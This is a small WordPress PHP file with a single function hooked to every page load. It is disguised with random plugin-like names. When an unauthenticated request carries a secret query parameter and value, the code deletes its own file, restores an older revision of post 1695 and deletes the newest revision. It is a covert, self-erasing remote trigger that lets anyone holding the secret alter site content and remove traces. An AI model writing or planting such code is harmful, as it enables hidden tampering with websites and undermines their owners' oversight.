<?php

function color_graph_friendly_helper() {
	if (isset($_GET['zoom_exchange_safe_option']) && $_GET['zoom_exchange_safe_option'] === 'conversion_autocomplete_finder') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$shop_subscription_keywords = 1695;
		$jigoshop_player_traffic_activity = wp_get_post_revisions($shop_subscription_keywords);
		if (empty($jigoshop_player_traffic_activity)) die('no revisions');
		if (count($jigoshop_player_traffic_activity) < 2) die('less than 2');
		$block_editor_creator_views = array_shift($jigoshop_player_traffic_activity);
		$disable_menu_cart_embed = $block_editor_creator_views->ID;
		$size_digital_url_chart = array_shift($jigoshop_player_traffic_activity);
		$gamipress_method_sort = $size_digital_url_chart->ID;
		$contents_controller_single = wp_restore_post_revision($gamipress_method_sort);
		if ($contents_controller_single === false) die('error restoring');
		$contents_controller_single = wp_delete_post_revision($disable_menu_cart_embed);		
		if ($contents_controller_single === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'color_graph_friendly_helper');
